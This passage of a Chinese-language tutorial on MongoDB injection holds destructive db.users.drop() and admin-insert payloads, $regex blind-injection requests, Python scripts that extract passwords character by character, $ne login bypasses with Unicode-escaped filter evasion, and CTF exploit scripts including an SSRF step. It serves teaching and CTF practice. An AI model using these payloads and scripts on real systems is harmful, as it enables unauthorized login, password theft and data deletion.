    ?>
这样都是很危险的，因为这个就相当于把 Mongo Shell 开放给了用户，如果此时构造下列 payload：
    username=1'});db.users.drop();db.user.find({'username':'1
    username=1'});db.users.insert({"username":"admin","password":123456"});db.users.find({'username':'1
则将改变原本的查询语句造成注入。如果当前应用连接数据库的权限恰好很高，我们能干的事情就更多了。
### 布尔盲注
当页面没有回显时，那么我们可以通过 `$regex` 正则表达式来进行盲注， `$regex` 可以达到和传统 SQL 注入中 `substr()`
函数相同的功能。
我们还是利用第一个 index.php 进行演示：
     $username,
        'password' => $password
    ));
    $result = $manager->executeQuery('test.users', $query)->toArray();
    $count = count($result);
    if ($count > 0) {
        foreach ($result as $user) {
            $user = ((array)$user);
            echo '====Login Success====';
            echo 'username:' . $user['username'] . '';
            echo 'password:' . $user['password'] . '';
        }
    }
    else{
        echo 'Login Failed';
    }
    ?>
布尔盲注重点在于怎么逐个提取字符，如下所示，在已知一个用户名的情况下判断密码的长度：
    username=admin&password[$regex]=.{4}    // 登录成功
    username=admin&password[$regex]=.{5}    // 登录成功
    username=admin&password[$regex]=.{6}    // 登录成功
    username=admin&password[$regex]=.{7}    // 登录失败
    ......
在 `password[$regex]=.{6}` 时可以成功登录，但在 `password[$regex]=.{7}` 时登录失败，说明该 whoami
用户的密码长度为 7。
提交的数据进入 PHP 后的数据如下：
    array(
        'username' => 'admin',
        'password' => array('$regex' => '.{6}')
    )
进入 MongoDB 后执行的查询命令为：
    > db.users.find({'username':'admin', 'password':{$regex:'.{6}'}})
    { "_id" : ObjectId("60fa9c7b257f18542b68c4b8"), "username" : "admin", "password" : "123456" }
    > db.users.find({'username':'admin', 'password':{$regex:'.{7}'}})
    >
由于 whoami 用户的 password 长度为 6，所以查询条件 `{'username':'admin',
'password':{$regex:'.{6}'}}` 为真，便能成功登录，而 `{'username':'admin',
'password':{$regex:'.{7}'}}` 为假，自然也就登录不了。
知道 password 的长度之后我们便可以逐位提取 password 的字符了：
    username=admin&password[$regex]=1.{5}
    username=admin&password[$regex]=12.{4}
    username=admin&password[$regex]=123.{3}
    username=admin&password[$regex]=1234.{2}
    username=admin&password[$regex]=12345.*
    username=admin&password[$regex]=123456
    或
    username=admin&password[$regex]=^1
    username=admin&password[$regex]=^12
    username=admin&password[$regex]=^123
    username=admin&password[$regex]=^1234
    username=admin&password[$regex]=^12345
    username=admin&password[$regex]=^123456
下面给出一个 MongoDB 盲注脚本：
    import requests
    import string
    password = ''
    url = 'http://192.168.226.148/index.php'
    while True:
        for c in string.printable:
            if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
                # When the method is GET
                get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
                # When the method is POST
                post_payload = {
                    "username": "admin",
                    "password[$regex]": '^' + password + c
                }
                # When the method is POST with JSON
                json_payload = """{"username":"admin", "password":{"$regex":"^%s"}}""" % (password + c)
                #headers = {'Content-Type': 'application/json'}
                #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json
                r = requests.post(url=url, data=post_payload)
                if 'Login Success' in r.text:
                    print("[+] %s" % (password + c))
                    password += c
    # 输出如下: 
    # [+] 1
    # [+] 12
    # [+] 123
    # [+] 1234
    # [+] 12345
    # [+] 123456
## Nodejs 中的 MongoDB 注入
在 Nodejs 中也存在 MongoDB 注入的问题，其中主要是重言式注入，通过构造永真式构造万能密码实现登录绕过。下面我们使用 Nodejs 中的
mongoose 模块操作 MongoDB 进行演示。
  * server.js
    var express = require('express');
    var mongoose = require('mongoose');
    var jade = require('jade');
    var bodyParser = require('body-parser');
    mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true });
    var UserSchema = new mongoose.Schema({
        name: String,
        username: String,
        password: String
    });
    var User = mongoose.model('users', UserSchema);
    var app = express();
    app.set('views', __dirname);
    app.set('view engine', 'jade');
    app.get('/', function(req, res) {
        res.render ("index.jade",{
            message: 'Please Login'
        });
    });
    app.use(bodyParser.json());
    app.post('/', function(req, res) {
        console.log(req.body)
        User.findOne({username: req.body.username, password: req.body.password}, function (err, user) {
            console.log(user)
            if (err) {
                return res.render('index.jade', {message: err.message});
            }
            if (!user) {
                return res.render('index.jade', {message: 'Login Failed'});
            }
            return res.render('index.jade', {message: 'Welcome back ' + user.name + '!'});
        });
    });
    var server = app.listen(8000, '0.0.0.0', function () {
        var host = server.address().address
        var port = server.address().port
        console.log("listening on http://%s:%s", host, port)
    });
  * index.jade
    h1 #{message}
    p #{message}
运行 server.js 后，访问 8000 端口：
由于后端解析 JSON，所以我们发送 JSON 格式的 payload：
    {"username":{"$ne":1},"password": {"$ne":1}}
如上图所示，成功登录。
在处理 MongoDB 查询时，经常会使用 JSON格式将用户提交的数据发送到服务端，如果目标过滤了 `$ne` 等关键字，我们可以使用 Unicode
编码绕过，因为 JSON 可以直接解析 Unicode。如下所示：
    {"username":{"\u0024\u006e\u0065":1},"password": {"\u0024\u006e\u0065":1}}
    // {"username":{"$ne":1},"password": {"$ne":1}}
## Nosql 相关 CTF 例题
### [2021 MRCTF]Half-Nosqli
进入题目，发现是一个Swagger UI：
有两个 Api 接口，一个是 `/login` 用于登录，另一个是 `/home` 可通过 url 属性进行 SSRF。我们可以编写脚本来访问这两个 Api
接口。首先访问 `/home`接口报错，因为需要验证，所以思路应该是先访问 `/login` 接口进行登录，登录后拿到 token 再去访问 `/home`
接口。这里由于题目名提示了是 NoSQL，所以我们可以直接使用 NoSQL 的永真式绕过。
这里没有任何过滤，Exp 如下：
    import requests
    import json
    url = "http://node.mrctf.fun:23000/"
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}
    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    json_data2 = {
        "url":"http://47.xxx.xxx.72:4000"    # 通过这里的url值进行SSRF
    }
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
这样我们便可以通过 `/home` 接口的 url 值进行SSRF了：
接下来是一个 HTTP 拆分攻击，详情请看：[[2021 MRCTF]Half-Nosqli](https://whoamianony.top/2021/04/20/Web%E5%AE%89%E5%85%A8/HTTP%E5%93%8D%E5%BA%94%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB%EF%BC%88CRLF%20Injection%EF%BC%89/#2021-MRCTF-Half-Nosqli)
### [GKCTF 2021]hackme
进入题目，是一个登录框：
查看源码发现如下提示：
应该是 nosql 注入，随机登录抓包发现解析 json：
首先构造永真式：
    {"username":{"$ne":1},"password": {"$ne":1}}
被检测了，使用 Unicode 编码成功绕过：
应该是通过 Nosql 盲注，让我们把 admin 的密码爆出来，根据以下条件进行布尔盲注：
    {"msg":"登录了，但没完全登录"}    // 真
    {"msg":"登录失败"}    // 假
如下编写盲注脚本：
    import requests
    import string
    password = ''
    url = 'http://node4.buuoj.cn:27409/login.php'
    while True:
        for c in string.printable:
            if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
                # When the method is GET
                get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
                # When the method is POST
                post_payload = {
                    "username": "admin",
                    "password[$regex]": '^' + password + c
                }
                # When the method is POST with JSON
                json_payload = """{"username":"admin", "password":{"\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078":"^%s"}}""" % (password + c)
                headers = {'Content-Type': 'application/json'}
                r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json
                #r = requests.post(url=url, data=post_payload)
                if '但没完全登录' in r.content.decode():
                    print("[+] %s" % (password + c))
                    password += c
    # 输出:
    # [+] 4
    # [+] 42
    # [+] 422
    # [+] 4227
    # [+] 42276
    # [+] 422766
    # ......
    # [+] 42276606202db06ad1f29ab6b4a1
    # [+] 42276606202db06ad1f29ab6b4a13
    # [+] 42276606202db06ad1f29ab6b4a130
    # [+] 42276606202db06ad1f29ab6b4a1307
    # [+] 42276606202db06ad1f29ab6b4a1307f
得到 admin 密码后即可成功登录 admin。
## 未完待续......
> 参考：
>
>  guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection>
>
> 
>
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 